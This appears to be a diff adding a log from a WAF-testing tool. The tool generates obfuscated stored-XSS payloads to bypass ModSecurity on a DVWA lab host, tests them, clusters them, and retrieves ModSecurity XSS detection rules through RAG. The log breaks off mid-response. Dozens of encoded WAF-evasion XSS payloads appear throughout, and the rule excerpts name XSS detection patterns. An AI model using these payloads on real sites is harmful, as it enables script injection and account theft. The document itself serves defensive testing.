@@ -1,0 +1,544 @@
+importing libs...
+Setting-up Flask app...
+Starting Flask app...
+ * Debugger is active!
+ * Debugger PIN: 122-951-074
+127.0.0.1 - - [10/May/2026 15:17:43] "OPTIONS /api/attack/1-detect-waf HTTP/1.1" 200 -
+[DETECT-WAF] Detecting domain: http://modsec.llmshield.click
+[DETECT-WAF] Detected: ModSecurity (SpiderLabs)
+127.0.0.1 - - [10/May/2026 15:17:43] "POST /api/attack/1-detect-waf HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:17:43] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: SVG onEvent_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass
+	%253Cimg/%252A%252150000/src%253Dx/%252A%252150000/onerror%253Dalert%2528469%2529%253E
+127.0.0.1 - - [10/May/2026 15:18:02] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:18:02] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: obf_whitespace_url+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass
+	%253cBody%252bOnlOAd%253dALErT%25281%2529%253e
+127.0.0.1 - - [10/May/2026 15:18:18] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:18:18] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: obf_double_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss
+	%253Caudio%2520onkeydown%253D%2527alert%25281%2529%2527%253Etest%253C%252Faudio%253E
+127.0.0.1 - - [10/May/2026 15:18:36] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:18:36] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass
+	%253CsVG/onlOAd%253DaLeRT%25281%2529%253E
+127.0.0.1 - - [10/May/2026 15:18:49] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:18:49] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: Direct JS Call XSS (manual refine)_non_script_xss+obf_double_url_encode+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass
+	%25253cScriPt%25253EalErT%2525281%252529%25253C/sCrIPt%25253e
+127.0.0.1 - - [10/May/2026 15:19:07] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:19:07] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass
+	ONMoUseovEr= <img src=x onerror=alert(1)>
+127.0.0.1 - - [10/May/2026 15:19:20] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:19:20] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: Event Handler XSS (heuristic)_adv_obf_full_bypass
+	onmouseover%3D
+127.0.0.1 - - [10/May/2026 15:19:29] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:19:29] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass
+	%253cImG%2520SRC%253DX%2520OnERrOr%253dALErT%25281%2529%253e
+127.0.0.1 - - [10/May/2026 15:19:46] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:19:46] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: obf_double_url_encode+obf_whitespace_url_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss
+	%253Csvg/onloAd%253Dconfirm%25281%2529%253E
+127.0.0.1 - - [10/May/2026 15:20:02] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:20:02] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[RANDOM-PAYLOAD] 0/1 | xss_stored
+	Techniques: obf_whitespace_url+obf_case_random_full_bypass
+	%253Csvg/onlOad%253DalERT%25281%2529%253E
+127.0.0.1 - - [10/May/2026 15:20:11] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:20:11] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+[DVWA] Logging in to http://modsec.llmshield.click...
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.30s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.30s/it]
+127.0.0.1 - - [10/May/2026 15:20:14] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.19s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.19s/it]
+127.0.0.1 - - [10/May/2026 15:20:15] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.21s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.21s/it]
+127.0.0.1 - - [10/May/2026 15:20:16] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.79s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.79s/it]
+127.0.0.1 - - [10/May/2026 15:20:18] "POST /api/attack/3-test HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:20:18] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.18s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.18s/it]
+127.0.0.1 - - [10/May/2026 15:20:19] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.17s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.17s/it]
+127.0.0.1 - - [10/May/2026 15:20:20] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.33s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.33s/it]
+127.0.0.1 - - [10/May/2026 15:20:22] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.16s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.16s/it]
+127.0.0.1 - - [10/May/2026 15:20:23] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.15s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.15s/it]
+127.0.0.1 - - [10/May/2026 15:20:24] "POST /api/attack/3-test HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:20:24] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|                                        | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.57s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|################################| 1/1 [00:01<00:00,  1.57s/it]
+127.0.0.1 - - [10/May/2026 15:20:26] "POST /api/attack/3-test HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:20:26] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 10 probe(s)
+	％２５３сѕVg＆＃４７；ОnⅬОаD％２５３dАⅼЕrt％２５２８１％２５２９％２５３е
+127.0.0.1 - - [10/May/2026 15:20:45] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:20:45] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 11 probe(s)
+	%%EF%BC%92%EF%BC%95%EF%BC%93C%EF%BD%93V%EF%BD%87%2FO%EF%BD%8E%EF%BD%8C%EF%BD%8FAD%EF%BD%92I%EF%BD%8E%25%EF%BC%92%EF%BC%95%EF%BC%93%EF%BD%81%EF%BD%8C%EF%BD%95S%EF%BD%8
+127.0.0.1 - - [10/May/2026 15:21:04] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:21:04] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 12 probe(s)
+	%253CsvG&#47;oNLoAD%253daLert%25281%2529%253E
+127.0.0.1 - - [10/May/2026 15:21:23] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:21:23] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 13 probe(s)
+	%253CiMG%2520SRc%253dX%2520onerROr%253DalERT%25281%2529%253e
+127.0.0.1 - - [10/May/2026 15:21:41] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:21:42] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 14 probe(s)
+	％２５３СІFRａMｅ％２５２０ЅｒС％２５３DJａｖАЅｃRｉPT％２５３ААｌｅRT％２５２８１％２５２９％２５３Е
+127.0.0.1 - - [10/May/2026 15:22:00] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:22:00] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 15 probe(s)
+	%253CSvg/OnLoad%253DAleRt%25281%2529%253e
+127.0.0.1 - - [10/May/2026 15:22:21] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:22:21] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 16 probe(s)
+	%253ciMg%2520SrC%253dx%2520ONerroR%253DaleRt%25281%2529%253e
+127.0.0.1 - - [10/May/2026 15:22:40] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:22:40] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 17 probe(s)
+	%253csCript%253EXHr=NEw%2520acTIvEXObJeCT%2528%2522msxml2.XmlHtTp%2522%2529;XhR.OPen%2528%2522gEt%2522, %2522/XsSme2%2522, TrUe%2529;XhR.onReadysTATecHANGe=FuNcTion%2528%252
+127.0.0.1 - - [10/May/2026 15:22:58] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:22:58] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 18 probe(s)
+	%253csvg%2FonLOaD%253dalErT%25281%2529%253e
+127.0.0.1 - - [10/May/2026 15:23:17] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:23:17] "OPTIONS /api/attack/2-generate-payload HTTP/1.1" 200 -
+[ADAPTIVE-PAYLOAD] 0/1 | xss_stored | 19 probe(s)
+	onclick%253D?:%252520//🕷️@dyconstatic odkazy Перейти&klp＆K？ftPF＝Gjsq /*'*/
+127.0.0.1 - - [10/May/2026 15:23:27] "POST /api/attack/2-generate-payload HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:23:27] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.27s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.27s/it]
+127.0.0.1 - - [10/May/2026 15:23:28] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.13s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.13s/it]
+127.0.0.1 - - [10/May/2026 15:23:29] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.16s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.16s/it]
+127.0.0.1 - - [10/May/2026 15:23:30] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.27s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.27s/it]
+127.0.0.1 - - [10/May/2026 15:23:32] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.23s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.23s/it]
+127.0.0.1 - - [10/May/2026 15:23:33] "POST /api/attack/3-test HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:23:33] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.11s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.12s/it]
+127.0.0.1 - - [10/May/2026 15:23:34] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.89s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.89s/it]
+127.0.0.1 - - [10/May/2026 15:23:36] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.41s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.41s/it]
+127.0.0.1 - - [10/May/2026 15:23:38] "POST /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.12s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:01<00:00,  1.12s/it]
+127.0.0.1 - - [10/May/2026 15:23:39] "POST /api/attack/3-test HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:23:39] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click:   0%|           | 0/1 [00:00<?, ?it/s]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:02<00:00,  2.88s/it]
+[TEST-ATTACK] 1 payloads on modsec.llmshield.click: 100%|###| 1/1 [00:02<00:00,  2.88s/it]
+127.0.0.1 - - [10/May/2026 15:23:42] "POST /api/attack/3-test HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:24:02] "OPTIONS /api/defend/1-clustering HTTP/1.1" 200 -
+[CLUSTERING] Formed 3 clusters from 16 payloads
+	Cluster 2 -> 4 payloads
+		%253Cimg/%252A%252150000/src%253Dx/%252A%252150000/onerror%253Dalert%2528469%2529%253E
+		%253cImG%2520SRC%253DX%2520OnERrOr%253dALErT%25281%2529%253e
+		%253CiMG%2520SRc%253dX%2520onerROr%253DalERT%25281%2529%253e
+		%253ciMg%2520SrC%253dx%2520ONerroR%253DaleRt%25281%2529%253e
+	Cluster 1 -> 7 payloads
+		%253cBody%252bOnlOAd%253dALErT%25281%2529%253e
+		%253CsVG/onlOAd%253DaLeRT%25281%2529%253E
+		%253Csvg/onloAd%253Dconfirm%25281%2529%253E
+		%253Csvg/onlOad%253DalERT%25281%2529%253E
+		%253CsvG&#47;oNLoAD%253daLert%25281%2529%253E
+		%253CSvg/OnLoad%253DAleRt%25281%2529%253e
+		%253csvg%2FonLOaD%253dalErT%25281%2529%253e
+	Cluster 0 -> 5 payloads
+		%253Caudio%2520onkeydown%253D%2527alert%25281%2529%2527%253Etest%253C%252Faudio%253E
+		%25253cScriPt%25253EalErT%2525281%252529%25253C/sCrIPt%25253e
+		％２５３сѕVg＆＃４７；ОnⅬОаD％２５３dАⅼЕrt％２５２８１％２５２９％２５３е
+		％２５３СІFRａMｅ％２５２０ЅｒС％２５３DJａｖАЅｃRｉPT％２５３ААｌｅRT％２５２８１％２５２９％２５３Е
+		%253csCript%253EXHr=NEw%2520acTIvEXObJeCT%2528%2522msxml2.XmlHtTp%2522%2529;XhR.OPen%2528%2522gEt%2522, %2522/XsSme2%2522, TrUe%2529;XhR.onReadysTATecHANGe=FuNcTion%2528%252
+127.0.0.1 - - [10/May/2026 15:24:02] "POST /api/defend/1-clustering HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:24:02] "OPTIONS /api/defend/2-rag-retrieve HTTP/1.1" 200 -
+[LLM4WAF -> LLMShield RAG] url=https://overrigged-savingly-nelle.ngrok-free.dev?action=rag_retrieve
+[LLM4WAF -> LLMShield RAG] attack_type='xss_stored', waf_name='ModSecurity (SpiderLabs)'
+[LLMShield RAG] Raw response: {'rag_enabled': True, 'num_queries': 9, 'num_docs_all': 59, 'num_docs_filtered': 40, 'num_docs_preselected': 32, 'sources': [{'rank': 1, 'source': 'kemp_loadmaster_modsecurity_waf_rule_writing_rag_optimized_knowledge_base.md', 'data_type': 'Rules', 'waf_type': 'ModSecurity', 'chunk_id': 37, 'total_chunks': 48, 'page_start': None, 'page_end': None, 'block_types': ['heading', 'rule_block', 'code_fence'], 'rerank_score_raw': '1.398', 'relevance_score_display': '1.000', 'relevance_score': '1.398', 'content': 'SecRule ARGS|REQUEST_HEADERS "@rx <\\s*script\\b|onerror\\s*=|onload\\s*=|javascript:" \\\n\n  "id:200101,\\\n  phase:2,\\\n  deny,\\\n  status:403,\\\n  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase,\\\n  log,\\\n  auditlog,\\\n  msg:\'XSS payload detected in request input\',\\\n  logdata:\'%{MATCHED_VAR}\',\\\n  tag:\'attack-xss\'"\n\n```\n\nUse narrower target if known:\n\n```apache\n\nSecRule ARGS:q "@rx <\\s*script\\b|onerror\\s*=|javascript:" \\\n\n  "id:200102,\\\n  phase:2,\\\n  deny,\\\n  status:403,\\\n  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase,\\\n  log,\\\n  auditlog,\\\n  msg:\'XSS payload detected in q parameter\',\\\n  logdata:\'%{MATCHED_VAR}\',\\\n  tag:\'attack-xss\'"\n\n```\n\n## 20.2 SQL Injection Rule Guidance\n\nThis LoadMaster guide does not provide a dedicated SQLi signature. For SQLi rule generation, prefer a CRS 942 SQLi knowledge base. If only this document is retrieved, use its ModSecurity mechanics and produce a conservative rule.\n\nGeneric SQLi rule:\n\n```apache'}, {'rank': 2, 'source': 'modsecurity_making_rules_rag_optimized_knowledge_base.md', 'data_type': 'Rules', 'waf_type': 'ModSecurity', 'chunk_id': 33, 'total_chunks': 60, 'page_start': None, 'page_end': None, 'block_types': ['heading', 'code_fence', 'instruction_block'], 'rerank_score_raw': '1.226', 'relevance_score_display': '0.707', 'relevance_score': '1.226', 'content': 'Better transformation order:\n\n```apache\nSecRule ARGS "@rx <\\s*script\\b|onerror\\s*=|javascript:" \\\n  "id:400006,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,deny,status:403,log,auditlog,msg:\'XSS payload detected after decoding and normalization\',tag:\'attack-xss\',severity:\'CRITICAL\'"\n```\n\n## 8.5 XSS Rule Generation Pattern\n\nRecommended XSS rule for request inputs:\n\n```apache\nSecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS "@rx <\\s*script\\b|onerror\\s*=|onload\\s*=|javascript:|<\\s*svg\\b|<\\s*img\\b" \\\n  "id:400100,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,deny,status:403,log,auditlog,msg:\'XSS payload detected in request input\',tag:\'attack-xss\',severity:\'CRITICAL\'"\n```\n\nFor specific parameter:\n```apache'}, {'rank': 3, 'source': 'modsecurity_crs_941_xss_rules_rag_optimized_knowledge_base.md', 'data_type': 'Rules', 'waf_type': 'ModSecurity', 'chunk_id': 22, 'total_chunks': 74, 'page_start': None, 'page_end': None, 'block_types': ['heading', 'rule_block', 'code_fence', 'prose'], 'rerank_score_raw': '1.093', 'relevance_score_display': '0.479', 'relevance_score': '1.093', 'content': 'SecRule ARGS:q "@rx (?i)<script[^>]*>[\\s\\S]*?" \\\n\n  "id:100941110,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:\'Script tag XSS detected in q parameter\'"\n\n```\n\n---\n\n# 8. Rule 941120: XSS Category 2 Event Handler Vector\n\n## 8.1 Rule Identity\n\n```text\n\nRule ID: 941120\n\nParanoia level: PL1\n\nCategory: XSS Filter Category 2\n\nVector: Event handler injection\n\nOperator: @rx\n\n```\n\n## 8.2 Detection Intent\n\nDetect XSS vectors using HTML event handlers such as:\n\n```html\n\n<body onload="alert(1)">\n\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n```\n\n## 8.3 Core Pattern\n\n```apache\n\n@rx (?i)[\\s"\'`;\\/0-9=\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]on[a-zA-Z]+[\\s\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]*?=\n\n```\n\nMeaning:\n\n- Requires context before the event handler such as whitespace, quote, slash, digit, equals, or delimiter.\n- Detects `on` followed by letters, such as `onerror`, `onload`, `onclick`, `onmouseover`.\n- Allows whitespace and delimiter obfuscation before `=`.\n\n## 8.4 Rule-Generation Use\n\nUse this rule concept when payloads contain:\n\n```text\n\nonerror=\nonload=\nonclick=\nonmouseover=\n\n```\n\nA compact generated rule:\n\n```apache'}, {'rank': 4, 'source': 'modsecurity_crs_941_xss_rules_rag_optimized_knowledge_base.md', 'data_type': 'Rules', 'waf_type': 'ModSecurity', 'chunk_id': 58, 'total_chunks': 74, 'page_start': None, 'page_end': None, 'block_types': ['heading', 'rule_block', 'code_fence', 'prose'], 'rerank_score_raw': '0.811', 'relevance_score_display': '0.000', 'relevance_score': '0.811', 'content': 'SecRule ARGS "@rx (?i)<\\s*(script|svg|img)\\b|onerror\\s*=|javascript\\s*:" \\\n\n  "id:110005,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:\'Encoded XSS payload detected after normalization\'"\n\n```\n\n## 19.6 US-ASCII or UTF-7 Encoding XSS\n\nPayload examples:\n\n```text\n\n¼script¾alert(¢XSS¢)¼/script¾\n\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-\n\n```\n\nRecommended CRS references:\n\n```text\n\n941310\n941350\n\n```\n\nGenerated rule pattern:\n\n```apache'}], 'context': '[Reference 1]\nSource: kemp_loadmaster_modsecurity_waf_rule_writing_rag_optimized_knowledge_base.md\nType: Rules\nWAF: ModSecurity\nChunk: 37/48\nBlock types: [\'heading\', \'rule_block\', \'code_fence\']\nRaw rerank score: 1.398\n\nUseful excerpt:\nSecRule ARGS|REQUEST_HEADERS "@rx <\\s*script\\b|onerror\\s*=|onload\\s*=|javascript:" \\\n\n  "id:200101,\\\n  phase:2,\\\n  deny,\\\n  status:403,\\\n  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase,\\\n  log,\\\n  auditlog,\\\n  msg:\'XSS payload detected in request input\',\\\n  logdata:\'%{MATCHED_VAR}\',\\\n  tag:\'attack-xss\'"\n\n```\n\nUse narrower target if known:\n\n```apache\n\nSecRule ARGS:q "@rx <\\s*script\\b|onerror\\s*=|javascript:" \\\n\n  "id:200102,\\\n  phase:2,\\\n  deny,\\\n  status:403,\\\n  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase,\\\n  log,\\\n  auditlog,\\\n  msg:\'XSS payload detected in q parameter\',\\\n  logdata:\'%{MATCHED_VAR}\',\\\n  tag:\'attack-xss\'"\n\n```\n\n## 20.2 SQL Injection Rule Guidance\n\nThis LoadMaster guide does not provide a dedicated SQLi signature. For SQLi rule generation, prefer a CRS 942 SQLi knowledge base. If only this document is retrieved, use its ModSecurity mechanics and produce a conservative rule.\n\nGeneric SQLi rule:\n\n```apache\n\n---\n[Reference 2]\nSource: modsecurity_making_rules_rag_optimized_knowledge_base.md\nType: Rules\nWAF: ModSecurity\nChunk: 33/60\nBlock types: [\'heading\', \'code_fence\', \'instruction_block\']\nRaw rerank score: 1.226\n\nUseful excerpt:\nBetter transformation order:\n\n```apache\nSecRule ARGS "@rx <\\s*script\\b|onerror\\s*=|javascript:" \\\n  